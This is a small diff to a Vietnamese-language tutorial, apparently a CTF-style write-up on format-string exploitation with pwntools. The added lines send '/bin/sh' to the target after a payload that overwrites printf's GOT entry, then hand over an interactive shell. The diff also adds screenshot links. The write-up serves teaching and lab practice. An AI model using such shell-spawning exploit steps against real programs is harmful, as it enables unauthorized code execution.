@@ -412,6 +412,10 @@ Xử lí dữ liệu rồi đưa vào payload:
 	payload+=p64(exe.got['printf']+1)
 	p.sendlineafter(b'string: ',payload)
 
+	p.sendline(b'/bin/sh\0')   //đưa vào system chuỗi /bin/sh 
+
+![Alt text](image/fs28.png)
+
 ## Script Python:
 
 	#!/usr/bin/env python3
@@ -444,7 +448,11 @@ Xử lí dữ liệu rồi đưa vào payload:
 	payload+=p64(exe.got['printf'])
 	payload+=p64(exe.got['printf']+1)
 	p.sendlineafter(b'string: ',payload)
+
+	p.sendline(b'/bin/sh\0') 
 	
 	p.interactive()
 
 # Định dạng con "*"
+
+![Alt text](image/fs29.png)
